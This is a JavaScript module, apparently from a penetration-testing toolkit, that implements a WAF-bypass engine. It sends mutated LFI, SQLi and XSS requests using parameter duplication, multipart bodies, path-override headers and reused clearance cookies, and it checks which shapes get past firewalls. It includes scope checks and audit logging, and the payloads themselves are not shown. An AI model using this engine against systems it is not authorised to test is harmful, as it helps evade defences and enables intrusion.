const BENIGN_VALUE = 'index';

function buildRequest(mut, { u, method, param, template, baseHeaders }) {
  const headers = { ...(baseHeaders || {}), ...(mut.headers || {}) };
  let url = u.href;
  let body = null;
  let contentType = null;
  const hasBody = method !== 'GET' && method !== 'HEAD';

  // Path-override header games carry the injected URL in the header itself.
  for (const k of ['x-original-url', 'x-rewrite-url']) {
    if (k in headers && headers[k] == null) headers[k] = u.pathname + '?' + param + '=' + mut.payload;
  }

  if (!hasBody) {
    // Body-family mutations (duplicate/array/multipart/charset) need a request body;
    // on a GET/HEAD they are unexpressible -- the engine records an honest skip.
    if (mut.paramMode !== 'single' || mut.bodyKind === 'multipart') return null;
    if (mut.headers && Object.keys(mut.headers).some((k) => k.toLowerCase() === 'content-type')) return null;
    const sep = u.search ? '&' : '?';
    url = u.origin + u.pathname + u.search + sep + param + '=' + mut.payload;
    return { method, url, headers, body: null };
  }

  if (mut.bodyKind === 'multipart') {
    const boundary = '----varvelwafbypass7f3a9c';
    body = '--' + boundary + '\r\nContent-Disposition: form-data; name="' + param + '"\r\n\r\n' + mut.payload + '\r\n--' + boundary + '--\r\n';
    contentType = 'multipart/form-data; boundary=' + boundary;
  } else {
    const inTemplate = (v) => (template ? template.split('%%PAYLOAD%%').join(v) : param + '=' + v);
    if (mut.paramMode === 'dup-first') body = inTemplate(mut.payload) + '&' + param + '=' + BENIGN_VALUE;
    else if (mut.paramMode === 'dup-last') body = inTemplate(BENIGN_VALUE) + '&' + param + '=' + mut.payload;
    else if (mut.paramMode === 'array') body = template ? null : param + '[]=' + mut.payload; // template+array: skipped by the engine with an honest gap
    else body = inTemplate(mut.payload);
  }
  if (body == null) return null; // unexpressible combination -- the engine records a skip
  if (contentType) headers['content-type'] = contentType;
  return { method, url, headers, body };
}

// ---------------------------------------------------------------------------
// The audit line: one JSONL entry per run. Default sink appends to
// varvel/data/wafbypass-audit.jsonl (best-effort, never throws); injectable for tests.
// ---------------------------------------------------------------------------
const AUDIT_FILE = () => process.env.VARVEL_WAFBYPASS_AUDIT || join(dirname(fileURLToPath(import.meta.url)), '..', 'data', 'wafbypass-audit.jsonl');
function defaultAudit(entry) {
  try { mkdirSync(dirname(AUDIT_FILE()), { recursive: true }); appendFileSync(AUDIT_FILE(), JSON.stringify(entry) + '\n'); } catch { /* audit must never break the tool */ }
}

// ---------------------------------------------------------------------------
// The engine
// ---------------------------------------------------------------------------
export async function wafBypass(url, opts = {}) {
  const at0 = new Date().toISOString();
  const gaps = [];
  const auditSink = opts.audit === false ? null : (typeof opts.audit === 'function' ? opts.audit : defaultAudit);
  const finish = (report) => {
    if (auditSink) {
      try {
        auditSink({
          ts: new Date().toISOString(), tool: 'wafbypass', url: String(url || ''), class: String(opts.klass || opts.class || 'lfi'),
          param: String(opts.param || ''), ok: !!report.ok, tried: report.tried || 0, passing: (report.passingShapes || []).length,
          blocked: report.blockedCount || 0, budget: report.budget || 0,
        });
      } catch { /* audit tap must never break the tool */ }
    }
    return report;
  };
  const refuse = (reason, extra = {}) => finish({ ok: false, reason, gaps, at: at0, ...extra });

  try {
    // -- usage validation (refusals are data, never throws) --
    let u;
    try {
      u = new URL(String(url || ''));
      if (u.protocol !== 'http:' && u.protocol !== 'https:') throw new Error('scheme');
    } catch { return refuse('usage: --url must be an http(s) URL, got ' + JSON.stringify(url)); }
    const param = String(opts.param || '').trim();
    if (!param) return refuse('usage: --param <name> is required (the injection point, e.g. template)');
    const klass = String(opts.klass || opts.class || 'lfi').toLowerCase();
    if (!CLASSES[klass]) return refuse('usage: --class must be one of ' + Object.keys(CLASSES).join('|') + ' (got ' + klass + ')');
    if (opts.marker == null || opts.marker === '') {
      return refuse('usage: --marker <regex> is required -- the honesty contract: no success evidence, no bypass claim');
    }
    let markerRe;
    try { markerRe = new RegExp(String(opts.marker), 'i'); } catch (e) { return refuse('usage: --marker is not a valid regex: ' + msg(e)); }
    const method = String(opts.method || 'POST').toUpperCase();
    const budget = Math.max(1, Math.floor(Number(opts.budget)) || DEFAULT_BUDGET);
    const paceMs = Math.max(0, Number(opts.paceMs != null ? opts.paceMs : opts.pace) || 0) || (opts.paceMs == null && opts.pace == null ? DEFAULT_PACE : 0);
    const stability = Math.max(1, Math.floor(Number(opts.stability)) || DEFAULT_STABILITY);
    const first = !!opts.first;
    const blockSigs = Array.isArray(opts.blockSigs) && opts.blockSigs.length ? opts.blockSigs.map(String) : DEFAULT_BLOCK_SIGS;
    const template = opts.bodyTemplate != null ? String(opts.bodyTemplate) : null;
    const baseHeaders = opts.headers && typeof opts.headers === 'object' ? opts.headers : {};

    // -- governance gate 1: signed scope (BEFORE any request; refusal prints the CIDRs) --
    const scopeRes = await scopeCheck(u, opts.scope, opts.resolve || defaultResolve);
    if (!scopeRes.ok) return refuse(scopeRes.reason, { scope: scopeRes.scope || [], resolved: scopeRes.resolved });

    // -- governance gate 2: ghost egress --
    const ghost = opts.ghost || ghostFromSettings(opts.engagement);
    const gate = await ensureGhost(ghost, u);
    if (!gate.ok) return refuse(gate.reason, { scope: scopeRes.scope, resolved: scopeRes.resolved });

    // -- vault ride: auto-ride a valid clearance for the zone unless --no-ride --
    const rideRes = await resolveVaultRide(u, opts, ghost);
    if (!rideRes.ok) return refuse(rideRes.reason, { scope: scopeRes.scope, resolved: scopeRes.resolved });
    const ride = rideRes.ride;
    if (rideRes.gap) gaps.push(rideRes.gap);

    const requester = opts.requester || defaultRequester(ghost, { timeoutMs: opts.timeoutMs, baseHeaders, ride });
    const supportsHttp10 = !!opts.supportsHttp10; // the agent transport speaks HTTP/1.1 only

    // -- the matrix --
    const mutations = generateMutations({ klass, base: opts.basePayload });

    const passingShapes = [];
    const unstable = [];
    const others = [];
    const skipped = [];
    let used = 0, blockedCount = 0, mutationsTried = 0, lastStart = 0;
    let controlBlocked = null;

    // Transport-inexpressible variants are known UP FRONT (before --first can stop the
    // run): mark them skipped now so the gap report is complete even on a short run.
    const runnable = [];
    for (const mut of mutations) {
      if (mut.http10 && !supportsHttp10) {
        skipped.push({ id: mut.id, reason: 'HTTP/1.0 downgrade is not expressible through the agent transport (node http speaks 1.1)' });
      } else {
        runnable.push(mut);
      }
    }

    const send = async (req) => {
      const wait = lastStart ? paceMs - (Date.now() - lastStart) : 0;
      if (wait > 0) await sleep(wait);
      lastStart = Date.now();
      used++;
      return requester(req);
    };

    let stoppedByBudget = false;
    let stoppedByFirst = false;
    for (const mut of runnable) {
      const req = buildRequest(mut, { u, method, param, template, baseHeaders });
      if (!req) {
        skipped.push({ id: mut.id, reason: 'mutation is inexpressible with the given method/body-template combination' });
        continue;
      }
      if (used >= budget) { stoppedByBudget = true; break; }
      mutationsTried++;
      const res = await send(req);
      const cls = classify(res, { markerRe, blockSigs });
      if (mut.id === 'lfi-control-plain') controlBlocked = cls.verdict === 'BLOCKED';
      if (cls.verdict === 'BLOCKED') { blockedCount++; continue; }
      if (cls.verdict === 'OTHER') {
        if (others.length < 40) others.push({ id: mut.id, status: cls.status, size: String((res && res.body) || '').length, error: res && res.error });
        continue;
      }
      // PASS: re-verify stability before anything is claimed.
      let confirmed = 0;
      let budgetStarved = false;
      while (confirmed < stability) {
        if (used >= budget) { budgetStarved = true; break; }
        const rr = await send(req);
        const rc = classify(rr, { markerRe, blockSigs });
        if (rc.verdict !== 'PASS') break;
        confirmed++;
      }
      const entry = {
        mutation: { id: mut.id, family: mut.family, exotic: mut.exotic, note: mut.note, payload: mut.payload },
        status: cls.status,
        evidenceSnippet: cls.snippet,
        blockHits: cls.blockHits,
      };
      if (confirmed === stability) {
        passingShapes.push({ ...entry, stability: confirmed + '/' + stability + ' re-verified' });
        if (first) { stoppedByFirst = true; break; }
      } else {
        unstable.push({ ...entry, stability: confirmed + '/' + stability + (budgetStarved ? ' (budget exhausted)' : ' (re-check failed)'), verdict: 'NOT claimed -- failed stability re-verification' });
      }
    }

    // -- honest gaps --
    const untried = mutations.length - mutationsTried - skipped.length;
    if (stoppedByBudget && untried > 0) gaps.push(untried + ' mutation(s) untried (request budget ' + budget + ' exhausted) -- unobserved, not absent');
    if (stoppedByFirst && untried > 0) gaps.push(untried + ' mutation(s) untried (stopped at the first verified pass; re-run exhaustive for the full surface) -- unobserved, not absent');
    for (const s of skipped) gaps.push('skipped ' + s.id + ': ' + s.reason + ' -- unobserved, not absent');
    if (mutations.some((m) => m.family === 'http-game')) {
      gaps.push('path/method-override header variants target ORIGIN-DIRECT behavior -- Cloudflare normalizes or strips these headers at the edge, so a block here does not prove the origin signs the shape -- unobserved, not absent');
    }
    if (unstable.length) gaps.push(unstable.length + ' shape(s) passed once but FAILED stability re-verification (see unstable[]) -- recorded, never claimed');
    if (!passingShapes.length && !unstable.length) {
      gaps.push('no passing shape observed within budget -- absence of evidence is not evidence of absence; untested families are listed above');
    }

    return finish({
      ok: true,
      tool: 'wafbypass',
      url: u.href,
      class: klass,
      param,
      method,
      passingShapes,
      unstable,
      blockedCount,
      otherCount: others.length,
      others,
      controlBlocked,
      tried: used,
      mutationsTried,
      budget,
      paceMs,
      scope: { cidrs: scopeRes.scope, resolved: scopeRes.resolved },
      transport: ride ? ride.transport : gate.transport,
      ride: rideReport(ride),
      oracle: { marker: String(opts.marker), blockSigs, stability },
      gaps,
      note: 'a passing shape is marker-verified evidence on THIS target at THIS time (stability ' + stability + 'x) -- never a general WAF-bypass claim. Blocked shapes are signature observations; gaps are unobserved, not absent.',
      at: new Date().toISOString(),
    });
  } catch (e) {
    return refuse('wafbypass failed: ' + msg(e));
  }
}

// ---------------------------------------------------------------------------
// CLI surface (registered by the orchestrator in tools/cli.mjs):
//   wafbypass --url <u> --param <p> --class lfi|sqli|xss --marker <regex>
//             [--method POST] [--base <payload>] [--body-template <file>]
//             [--headers <file.json>] [--pace 1200] [--budget 60] [--first]
//             [--block-sig wordfence,cf-mitigated] [--scope <cidrCsv>] [--engagement <id>]
//             [--no-ride]
// ---------------------------------------------------------------------------
export const WAFBYPASS_USAGE = "wafbypass --url <u> --param <p> --class lfi|sqli|xss --marker <regex> [--method POST] [--base <payload>] [--body-template <file>] [--headers <file.json>] [--pace ms] [--budget n] [--first] [--block-sig csv] [--scope cidrCsv] [--no-ride] -- WAF-bypass mutation engine (marker-verified, stability-checked, ghost-ridden, scope-gated; auto-rides a valid vault clearance for the zone -- --no-ride forces cookieless)";

export async function cli(args, deps = {}) {
  const { readFileSync } = await import('node:fs');
  const a = Array.isArray(args) ? args.slice() : String(args || '').split(/\s+/).filter(Boolean);
  const flag = (name) => {
    const i = a.indexOf('--' + name);
    return i >= 0 && i + 1 < a.length ? a[i + 1] : null;
  };
  const opts = { ...deps };
  opts.param = flag('param') || undefined;
  opts.klass = flag('class') || undefined;
  opts.marker = flag('marker') || undefined;
  opts.method = flag('method') || undefined;
  opts.basePayload = flag('base') || undefined;
  if (flag('pace') != null) opts.paceMs = Number(flag('pace'));
  if (flag('budget') != null) opts.budget = Number(flag('budget'));
  if (flag('block-sig') != null) opts.blockSigs = String(flag('block-sig')).split(',').map((s) => s.trim()).filter(Boolean);
  opts.scope = flag('scope') || undefined;
  opts.engagement = flag('engagement') || undefined;
  opts.first = a.includes('--first');
  if (a.includes('--no-ride')) opts.ride = false;
  const tplFile = flag('body-template');
  if (tplFile) {
    try { opts.bodyTemplate = readFileSync(tplFile, 'utf8'); } catch (e) { return { ok: false, reason: 'could not read --body-template file ' + tplFile + ': ' + msg(e) }; }
  }
  const hdrFile = flag('headers');
  if (hdrFile) {
    try { opts.headers = JSON.parse(readFileSync(hdrFile, 'utf8')); } catch (e) { return { ok: false, reason: 'could not read/parse --headers file ' + hdrFile + ': ' + msg(e) }; }
  }
  const url = flag('url') || a[0];
  return wafBypass(url, opts);
}
